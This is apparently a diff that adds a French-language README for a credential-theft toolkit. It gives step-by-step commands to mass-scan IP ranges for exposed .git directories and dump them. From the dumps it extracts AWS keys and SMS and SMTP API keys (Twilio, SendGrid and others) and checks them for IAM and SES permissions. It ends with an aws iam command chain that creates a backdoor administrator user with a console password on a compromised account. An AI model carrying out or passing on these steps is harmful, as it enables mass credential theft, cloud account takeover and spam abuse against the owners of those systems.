@@ -1,0 +1,72 @@
+1 - Faire les commandes suivantes
+
+- source install.sh
+  install-sezyo-v2
+
+(sezyo v2 car le script de dump est le meme que la v2 (gitdumper sur github))
+
+Puis
+
+- curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
+  unzip awscliv2.zip
+  ./aws/install
+
+Là le script + AWS cli est installé
+
+2- Scan
+
+Importer son fichier ip.txt puis faire 
+- bash gitfinder.sh ip.txt 300 &
+300 etant le nombre de threads
+
+3- Dump
+
+Il faut split votre fichier vulns pour le multi-threads en faisant
+- split -l 100 vulns.txt lol
+100 etant le nombre de vulns par fichier creer
+Ensuite il suffit de faire 
+- for i in $(ls lol*); do nohup bash dumperz.sh $i &done&
+(attention de ne pas split en un nombre de fichier trop elever au risque de faire crash votre vps etant donné que les processes de dump se lance en meme temps
+
+4- Parser & check
+
+Déplacer le fichier akia.txt issu du dump dans le dossier parser
+puis faire 
+- bash parser.sh akia.txt
+Un fichier comboaws.txt serra creer
+
+Pour check il suffit de deplacer votre fichier comboaws dans le dossier scan_aws puis de faire
+- apt install jq 
+  python3 launch.py comboaws.txt
+2 choix s'offres à vous, option 1 check les perms iam puis creer un panel si les perms iam dispo et option 2, check les perms SES puis creer des creds et liste les senderfrom
+Les aws seront dans les dossier smtp et panel
+
+-----------------------------------------------------------------------------
+
+RAPPEL + commandes supplementaire
+
+1- si lors du lancement d'un scan/dump une erreur s'affiche mentionnant "httpx" il vous suffit de reexecuter les premières commande de l'étape 1 (install.sh)
+
+2- si lors d'un dump au lancement, votre fichier nohup ne grossi que très peut et aucun resultats dans les fichiers meme au bout de 10min,
+il est necessaire d'arreter le processus et de supprimer l'entiereté des fichiers qui ont été creer (lol(*), api_sms, smtp, akia, twillio, history, nohup)
+et enfin executer la commande "sed -i "s/\.git\/config//g" vulns.txt" et de nouveau suivre l'etape 3
+
+3- Pour arreter les processus en cours (gitfinder et dumper) faire "kill -9 $(ps aux | grep "git" | awk '{print $2}' | tr '\n' ' ')"
+								   "kill -9 $(ps aux | grep "dump" | awk '{print $2}' | tr '\n' ' ')"
+
+4- Pensez a supprimer vos fichiers après chaque etapes afin de vous y retrouver et pour le bon fonctionnement du script, si vous voulez les conservés, importez les
+
+5- Pour supprimer les dossiers restants des dump (ip ou ndd) vous pouvez faire "ls | grep -P "A" | xargs -d"\n" rm -r" la lettre A etant la première lettre des fichiers supprimés
+
+6- Pour creer un panel avec des informations voulus, faire "aws configure" puis entré les infos de l'aws (AKIA - PASS - Region - format(json))
+puis faire:
+aws iam create-user --user-name USER && aws iam attach-user-policy --user-name USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && aws iam create-login-profile --user-name USER --password "PASS"
+USER etant le nom d'utilisateur voulu, PASS etant le mot de passe voulu, enfin l'id de connexion apparaitra dans les lignes affichés (codes a 12 chiffres)
+
+-----------------------------------------------------------------------------
+
+Infos - 
+
+Le nombre d'aws crack graçe au script depend grandement de la liste d'ip / liste de vulns si vous obtenez peut de resultats pensez a changé de fournisseur
+Le checker de S3 comprend egalement le checker SES de base il n'est pas necessaire d'utiser le premier checker si vous souhaiter crack les S3
+Il n'y a pas de parser et de checker pour les api sms et les autres smtp il vous suffit simplement de faire un ctrl+f dans les fichiers de results puis de rechercher votre mot clé (sendgrid, nexmo...) et vous aurez les api a check
